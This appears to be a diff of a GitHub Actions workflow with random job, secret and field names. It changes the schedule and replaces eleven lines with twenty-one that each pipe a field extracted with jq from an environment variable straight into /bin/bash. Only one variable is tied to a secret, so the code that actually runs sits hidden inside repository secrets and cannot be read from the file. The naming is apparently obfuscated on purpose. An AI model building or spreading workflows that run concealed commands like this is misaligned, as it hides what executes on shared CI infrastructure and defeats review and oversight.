@@ -2,7 +2,7 @@ name: fanqiwei6121
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
+    - cron: '28 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: fanqiwei6121
         env:
-          vabzq723: ${{ secrets.vabzq723 }}
+          iwz99471: ${{ secrets.iwz99471 }}
         run: |
-          echo $vabzq723 | jq -r .fylcm5 | /bin/bash
-          echo $ioe9 | jq -r .dzgtv52 | /bin/bash
-          echo $rnybk067 | jq -r .ppow73 | /bin/bash
-          echo $sug56 | jq -r .rjst4 | /bin/bash
-          echo $yp9 | jq -r .gcdaa05926 | /bin/bash
-          echo $nuff61461 | jq -r .cmge075 | /bin/bash
-          echo $eds93587 | jq -r .y9 | /bin/bash
-          echo $ctdi25968 | jq -r .q598 | /bin/bash
-          echo $f7 | jq -r .v4 | /bin/bash
-          echo $pk71 | jq -r .gol07 | /bin/bash
-          echo $mvv304 | jq -r .yvusb21 | /bin/bash
+          echo $iwz99471 | jq -r .fyadh100 | /bin/bash
+          echo $af393 | jq -r .xfjwq3873 | /bin/bash
+          echo $cug29 | jq -r .cjgi501 | /bin/bash
+          echo $tk32814 | jq -r .iljl97417 | /bin/bash
+          echo $agbv5612 | jq -r .grvu5225 | /bin/bash
+          echo $qzxvw4 | jq -r .redn5 | /bin/bash
+          echo $hxeik4691 | jq -r .v3 | /bin/bash
+          echo $tmnfb403 | jq -r .bh3 | /bin/bash
+          echo $bt6968 | jq -r .oex69 | /bin/bash
+          echo $qt893 | jq -r .ycbp81562 | /bin/bash
+          echo $wupbl767 | jq -r .qx8 | /bin/bash
+          echo $rci87283 | jq -r .orn4 | /bin/bash
+          echo $amnkx33 | jq -r .or775 | /bin/bash
+          echo $xtu8 | jq -r .ef6 | /bin/bash
+          echo $vh67 | jq -r .e6 | /bin/bash
+          echo $zsdt1506 | jq -r .fidb1866 | /bin/bash
+          echo $hcp373 | jq -r .koi29379 | /bin/bash
+          echo $goa9 | jq -r .wb09 | /bin/bash
+          echo $a3 | jq -r .leqwi97155 | /bin/bash
+          echo $mt608 | jq -r .smisd03 | /bin/bash
+          echo $jepd2 | jq -r .zdot1 | /bin/bash
 
